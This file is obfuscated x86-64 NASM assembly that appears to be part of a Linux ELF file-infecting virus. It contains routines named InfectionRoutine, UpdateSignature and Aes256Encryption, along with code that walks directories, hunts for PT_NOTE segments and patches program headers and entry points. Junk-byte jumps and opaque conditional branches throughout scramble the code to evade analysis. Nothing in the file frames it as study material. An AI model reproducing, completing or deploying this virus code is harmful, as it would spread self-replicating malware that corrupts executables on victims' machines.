    mov         ecx, WINDOW_LENGTH*2
    jmp         $+5
db 0x42, 0x8e, 0xe7
    je          ..@bnJAfMneWcK9
    jne         ..@bnJAfMneWcK9
..@pWQnBEdAgSz7:
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.keyprev+2]
    jmp         $+4
db 0xbf, 0x28
    jl          ..@p31E2w4ylP4R
    jge         ..@p31E2w4ylP4R
..@PHu6aIaTSpAX:
    lea         r2, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    call        Strcpy
    jl          ..@xCJIP2FIxagZ
    jge         ..@xCJIP2FIxagZ
..@b8QYvE6NHUDh:
    mov         rax, SYS_FORK
    js          ..@hdtrMyD3mXvl
    jns         ..@hdtrMyD3mXvl
..@wZO8cYfLncq8:
    pop         rax
    push        rcx
    jmp         $+4
db 0x73, 0x2d
    jb          ..@AdpJudself7O
    jae         ..@AdpJudself7O
..@LEPgnHP9ogl5:
    pop         rdi
    jmp         $+4
db 0xe1, 0x31
    jmp         ..@mo9B8fenc9CK
..@d1jdPH6O65Cg:
    pop         rsi
    jmp         $+5
db 0x8b, 0x07, 0x8d
    jmp         $+3
db 0x88
    jmp         ..@WiEOYsmYjQCm
..@RWFcrwdgXuEJ:
%ifdef X86_32
    mov         ecx, DWORD [edi+file.filesize]
%endif
    jmp         $+3
db 0x7c
    js          ..@y4UVVVvtjwhQ
    jns         ..@y4UVVVvtjwhQ
..@cB9hMdryZ8VT:
    xor         rdx, rdx
    jmp         $+4
db 0x70, 0xea
    jmp         ..@A5nlAKvmWLEp
..@J7OgRdvOD5D2:
    pop         rax
    push        r4
    xchg        rcx, rcx
    jl          ..@mlT4MU8qBJGZ
    jge         ..@mlT4MU8qBJGZ
..@IG32CkQYGrUd:
%ifdef X86_32
    push        ebp
%endif
    jmp         $+5
db 0xaa, 0x34, 0x9c
    jmp         $+5
db 0xd7, 0x5b, 0x7d
    je          ..@FoP8OosupGtj
    jne         ..@FoP8OosupGtj
..@2AvP8mXpi6pp:
    mov         rax, rax
    ret
    jmp         $+5
db 0xb9, 0x02, 0x2d
    jmp         $+3
db 0xe5
    jmp         $+5
db 0x97, 0xc8, 0xd7
    jl          UnmapFile
    jge         UnmapFile
..@cEByjWQkQrWm:
    aesenc      xmm0, xmm1
    jmp         $+4
db 0x64, 0xdf
    jmp         ..@aZZClK3Fmx7M
..@gwjQtQXFn4nx:
    mov         QWORD [r2+p_h.p_memsz], r4
    js          ..@nbNPRARALyJt
    jns         ..@nbNPRARALyJt
..@E1TDWBfRehdA:
    push        rdi
    jmp         $+3
db 0x65
    je          ..@9uJSvRChqO6T
    jne         ..@9uJSvRChqO6T
..@msoFHxxK2YJh:
%ifndef ENABLE_DEBUGGING
    mov         rcx, rcx
%endif
    jmp         $+4
db 0x7c, 0x7b
    jl          ..@IgGUvjUhaGur
    jge         ..@IgGUvjUhaGur
..@tFQB3mBgoeMV:
    add         r1, signature_len-1
    mov         rdi, rdi
    mov         rbx, rbx
    jb          ..@5XokUOl5o7iT
    jae         ..@5XokUOl5o7iT
..@xeyIDO3W09jU:
    xor         r3, r3
    mov         m6, rax
    jmp         $+5
db 0xb9, 0xd9, 0xd9
    jmp         ..@tMHbGqTMJAmH
..@LwgTdeHoQNrc:
    mov         r1, r5
    call_vsp    Strlen
    add         r5, rax
    jmp         $+3
db 0x4d
    js          ..@3OCy12BMwpoa
    jns         ..@3OCy12BMwpoa
..@uAyigwWxcO6J:
    xor         rcx, rcx
    js          ..@8U8Vraqv15Qn
    jns         ..@8U8Vraqv15Qn
..@mBC6tfjiVbIz:
    shl         edi, 0x8
    jmp         ..@t9TRBltvv61m
..@kT5hJHRhLonK:
    je          ..@mp5lxM2kSc70
    jmp         $+4
db 0x36, 0x5c
    jmp         $+3
db 0xe3
    jmp         ..@1uVm9Y0Qh9pa
..@mymCsB7aJM40:
    rep movsb 
    jb          ..@xSh40Y0kVmwL
    jae         ..@xSh40Y0kVmwL
..@fyY9KkyZLmjI:
    xor         rdx, rdx
    rep         nop
    jmp         ..@jYlKso5Xnde7
..@FoP8OosupGtj:
%ifdef X86_32
    xor         ebp, ebp
%endif
    jmp         $+3
db 0x67
    js          ..@rCZYxujG8mGI
    jns         ..@rCZYxujG8mGI
..@UMBBr2dSG8iH:
    add         rcx, 2*bytes
    jmp         ..@R21xB5SfPdoE
..@R344vax7XaZH:
    mov         r2, 11b
    jl          ..@xM1DcXbR1Qsd
    jge         ..@xM1DcXbR1Qsd
..@NwHF7oj2MMWi:
    je          ..@Y61Jt6wG3DVA
    jl          ..@WMVTpEoNrN9a
    jge         ..@WMVTpEoNrN9a
..@mo9B8fenc9CK:
    sub         rsp, _LZSSE_OFF_size
    jmp         $+5
db 0x43, 0x83, 0xf1
    jl          ..@ieHsrPUAbtrM
    jge         ..@ieHsrPUAbtrM
..@Qx7mTrQMFsya:
    mov         r2, QWORD [r1+e_h.e_entry]
    xchg        rsi, rsi
    js          ..@QwMJPXSg69lv
    jns         ..@QwMJPXSg69lv
..@ZUffJ3Pqd3lf:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_WAIT4
%endif
    jmp         $+3
db 0x20
    jb          ..@3xst7oqCI3zY
    jae         ..@3xst7oqCI3zY
..@OYjCGgjcRB5x:
    mov         r1, r5
    jl          ..@OhVzH3hXQ8vu
    jge         ..@OhVzH3hXQ8vu
..@JAbnNYxV1Rhf:
    add         r4, r3
    jb          ..@HjJvf5Z8Jueg
    jae         ..@HjJvf5Z8Jueg
..@O56VXgxFN73n:
    xchg        rsi, rsi
    jmp         ..@jcosweNtsHYn
..@YQX2HrpWwwno:
    push        rsi
    jmp         $+5
db 0xa8, 0xde, 0xd6
    jmp         $+3
db 0x54
    jmp         ..@ULTYepOxPYGG
..@eqXDvRDNIGf1:
    jnz         ..@duECsJg4uPYy
    jmp         $+5
db 0xe6, 0x9f, 0x15
    jmp         ..@zG5v34hFby7T
..@xmTPl0CNlKLz:
    mov         ecx, WINDOW_LENGTH
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    mov         rsi, rdi
    jmp         ..@NcfV489FkQFK
..@Uf7hLHzA0Pob:
    pop         rdi
    je          ..@tOReMYymuVB9
    xchg        rdi, rdi
    jmp         $+3
db 0x9a
    jmp         ..@sOCOAbIqJbgp
..@IgGUvjUhaGur:
%ifndef ENABLE_DEBUGGING
    xor         r1, r1
%endif
    jmp         $+4
db 0x6b, 0x1f
    jmp         $+3
db 0xe4
    jmp         ..@CsBEQUtHXipa
..@DPLx9rmXwSlc:
    mov         QWORD [rsp+_INFDIR_OFF.dirindex], 0x00
    jmp         $+5
db 0x2d, 0xbc, 0x1b
    jmp         $+5
db 0x10, 0xba, 0x20
    je          ..@VF3poQ6EvKH7
    jne         ..@VF3poQ6EvKH7
..@Wje5R5pbCfW0:
    jmp         ..@zsINgtGROFAC
    jmp         $+3
db 0x14
    jmp         $+4
db 0xee, 0xbf
    je          ..@mp5lxM2kSc70
    jne         ..@mp5lxM2kSc70
..@bxKKaSgkSHTm:
    syscall
    jmp         $+3
db 0x4c
    jmp         $+4
db 0x2d, 0x58
    jmp         $+4
db 0xbe, 0x94
    je          ..@8s2VeMXvNryz
    jne         ..@8s2VeMXvNryz
FileValidation:
    jmp         ..@RBohGpyFFzJE
..@6FFnFEqsQJcU:
    call        Aes256Encryption
    push        rdx
    pop         rdx
    jmp         ..@usGhED6gcYol
..@VvXqfiDvOTNJ:
%ifndef ENABLE_DEBUGGING
    push        rax
%endif
    js          ..@Bq0l6uaIklUB
    jns         ..@Bq0l6uaIklUB
..@GFqnhf0gB2vV:
    cmp         bx, WORD [rsp+_LZSSE_OFF.w_index]
    mov         rbp, rbp
    jl          ..@iGt2oOtc4KdO
    jge         ..@iGt2oOtc4KdO
..@8U8Vraqv15Qn:
    mov         rdi, m6
    mov         rcx, m7
    jmp         $+3
db 0xf1
    jmp         $+3
db 0xdb
    jmp         ..@qi2BNOiIWeyD
..@P3dBHi5TAj0n:
    cmp         BYTE [r1], 0x00
    jb          ..@Cl65EQ4h9Igr
    jae         ..@Cl65EQ4h9Igr
..@aGpmDNtnY6Ig:
    add         rax, p_h.p_type
    cmp         DWORD [r2+rax], PT_NOTE
    jb          ..@xXDAyh4CamfQ
    jae         ..@xXDAyh4CamfQ
..@CL39mbKv9ZvO:
    cmp         BYTE [rsp+_INFDIR_OFF.depth], SUBDIR_MAXDEPTH
    jb          ..@563Qr773QADA
    jae         ..@563Qr773QADA
..@PZilfkYOMKFH:
    ret
    jl          UpdateSignature
    jge         UpdateSignature
..@jZNHZu1OlzXk:
%ifdef X86_32
    mov         rcx, rcx
    xchg        rdx, rdx
%endif
    jmp         $+5
db 0x51, 0xb3, 0x46
    jmp         $+4
db 0xb0, 0x36
    jl          ..@xYGeT4A0bkbL
    jge         ..@xYGeT4A0bkbL
..@yGP7k9is8nhk:
    pop         rax
    mov         rax, rdi
    jmp         $+3
db 0xf7
    js          ..@KjlO1FxFuj5e
    jns         ..@KjlO1FxFuj5e
..@fNKReZ4hsFYo:
    rep         cmpsb
    jb          ..@4V4R71E7xh0h
    jae         ..@4V4R71E7xh0h
..@abOADxwojGwO:
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    mov         rbx, rbx
    jmp         ..@aj27LNE1fx5P
..@ssGRqXVzT0n6:
    mov         QWORD [rsp+_DYNPIE_OFF.sh_ptr], r1
    jmp         $+5
db 0x13, 0xb7, 0x81
    je          ..@6it4v6xZUX1D
    jne         ..@6it4v6xZUX1D
..@kv1nHEuohXT0:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    jmp         $+5
db 0x37, 0xc9, 0x9e
    je          InfectionRoutine
    jne         InfectionRoutine
..@UFY9CdBtWCwA:
    lea         r4, [r1]
    jmp         ..@AVTEes2ggyng
..@gQcwhaAcZX8a:
    sub         r2, 1
    cmp         r2, 0
    jmp         ..@6WgSwWLdvxZc
..@LmV1haaAYSoF:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], dl
    jmp         ..@0Y1FJiNQJXUt
..@ImMO7Vb0oTJH:
    movdqu      xmm1, oWORD [rsp]
    pxor        xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x10]
    jb          ..@Rt9yFJh3MAIN
    jae         ..@Rt9yFJh3MAIN
..@crD0ydGEznVa:
    pop         rsi
    jl          ..@lv9vX6co2I6U
    jge         ..@lv9vX6co2I6U
..@amJk22FETKlb:
    mov         r4, QWORD [rsp+_PROC_OFF.dirindex]
    js          ..@xAwt64CgrWOr
    jns         ..@xAwt64CgrWOr
..@FNvkNnwrQhPc:
    add         r4, 1
    jmp         $+5
db 0x1e, 0x31, 0x58
    jmp         $+3
db 0x84
    jl          ..@lbXTHjgzvfp3
    jge         ..@lbXTHjgzvfp3
..@o8bpr1RdZ68Q:
    push        r5
    jmp         $+5
db 0xb6, 0xcf, 0x6f
    jmp         $+5
db 0xc6, 0x7b, 0x13
    jmp         $+5
db 0x95, 0x01, 0x89
    jmp         $+5
db 0x69, 0x20, 0xb5
    jmp         $+4
db 0xb9, 0x61
    jl          ..@tbvOWIdWk4q4
    jge         ..@tbvOWIdWk4q4
..@niSNHW59xgtA:
    mov         r3, r4
    js          ..@ZuFALXSYx54K
    jns         ..@ZuFALXSYx54K
..@EQ0XF3CXkcUu:
    push        rdx
    pop         rdx
    push        rbx
    js          ..@iv773UUFvSn8
    jns         ..@iv773UUFvSn8
..@Cg2bze3rWJZk:
    xchg        rdx, rdx
    pop         rdx
    jmp         ..@UdR7ADqRoYyo

_eof: